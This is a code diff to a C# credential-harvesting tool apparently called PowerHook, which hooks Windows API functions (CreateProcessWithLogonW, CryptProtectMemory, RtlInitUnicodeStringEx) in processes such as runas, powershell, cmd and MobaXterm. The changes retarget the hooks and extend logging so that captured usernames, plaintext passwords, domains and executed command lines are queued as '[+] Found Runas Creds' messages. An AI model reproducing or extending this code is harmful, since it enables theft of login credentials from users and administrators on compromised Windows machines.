@@ -121,7 +121,7 @@ namespace PowerHook
 
 
             //Install hooks
-            if (currentProcess == "mstsc")
+            if (currentProcess == "runas" || currentProcess == "powershell")
             {
                 // RunAs hook function
                 LoadLibrary("Advapi32.dll");
@@ -143,11 +143,14 @@ namespace PowerHook
                 new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
                 this);
 
-                // Activate hooks on all threads except the current thread
+                //Activate hooks on all threads except the current thread
                 createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+
+
+
+
             }
             
-
             if (currentProcess == "MobaXterm")
             {
                 //MobaXterm hook function
@@ -224,10 +227,10 @@ namespace PowerHook
 
 
         //CMD
-        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
         delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
 
-        [DllImport("ntdll.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        [DllImport("ntdll.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
         static extern bool RtlInitUnicodeStringEx(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
 
         bool RtlInitUnicodeStringEx_Hook(
@@ -242,10 +245,12 @@ namespace PowerHook
                     {
 
 
-                        String Data = SourceString;
+                        String Data =  SourceString;
 
                         this._messageQueue.Enqueue(
                         string.Format("[+] Found cmd Login --> {0}", Data));
+                        
+                        
 
 
                     }
@@ -343,6 +348,7 @@ namespace PowerHook
             return CryptProtectMemory(pData, cbData, dwFlags);
         }
 
+
         //RUNAS
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
         delegate bool CreateProcessWithLogonW_Delegate(String userName,
@@ -397,10 +403,11 @@ namespace PowerHook
                         var Domain = domain;
                         var username = userName;
                         var Password = password;
+                        var CommandLine = commandLine;
 
-                     
+
                         this._messageQueue.Enqueue(
-                            string.Format("[+] Found Runas Creds --> Username: {0}, Password: {1}, Domain: {2}", username, Password, Domain));
+                            string.Format("[+] Found Runas Creds --> Username: {0}, Password: {1}, Domain: {2}, Executed: {3}", username, Password, Domain, CommandLine));
                         
                     }
                 }
